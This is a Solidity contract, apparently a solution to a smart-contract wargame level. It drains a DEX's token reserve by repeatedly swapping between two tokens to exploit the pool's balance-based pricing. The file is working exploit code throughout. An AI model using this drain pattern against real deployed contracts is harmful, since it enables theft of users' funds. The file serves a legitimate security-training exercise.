// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Level22 {
    function attack(address addr) public {
        address(addr).call(abi.encodeWithSignature("approve(address,uint256)", addr, type(uint256).max));
        (, bytes memory data1) = address(addr).staticcall(abi.encodeWithSignature("token1()"));
        (, bytes memory data2) = address(addr).staticcall(abi.encodeWithSignature("token2()"));
        address token1 = abi.decode(data1, (address));
        address token2 = abi.decode(data2, (address));
        address(addr).call(
            abi.encodeWithSignature(
                "swap(address,address,uint256)", token1, token2, IERC20(token1).balanceOf(address(this))
            )
        );
        while (true) {
            bool isToken1 = true;
            uint256 bal = IERC20(token1).balanceOf(address(this));
            if (bal == 0) {
                bal = IERC20(token2).balanceOf(address(this));
                isToken1 = false;
            }
            uint256 dexAmount = IERC20(isToken1 ? token2 : token1).balanceOf(addr);
            (, bytes memory d) = address(addr).staticcall(
                abi.encodeWithSignature(
                    "getSwapPrice(address,address,uint256)", isToken1 ? token1 : token2, isToken1 ? token2 : token1, bal
                )
            );
            uint256 swapOut = abi.decode(d, (uint256));
            if (swapOut > dexAmount) {
                (, bytes memory d1) = address(addr).staticcall(
                    abi.encodeWithSignature(
                        "getSwapPrice(address,address,uint256)",
                        isToken1 ? token2 : token1,
                        isToken1 ? token1 : token2,
                        dexAmount
                    )
                );
                uint256 amountInIndeed = abi.decode(d1, (uint256));
                address(addr).call(
                    abi.encodeWithSignature(
                        "swap(address,address,uint256)",
                        isToken1 ? token1 : token2,
                        isToken1 ? token2 : token1,
                        amountInIndeed
                    )
                );
                break;
            } else {
                address(addr).call(
                    abi.encodeWithSignature(
                        "swap(address,address,uint256)",
                        isToken1 ? token1 : token2,
                        isToken1 ? token2 : token1,
                        IERC20(isToken1 ? token1 : token2).balanceOf(address(this))
                    )
                );
            }
        }
    }
}
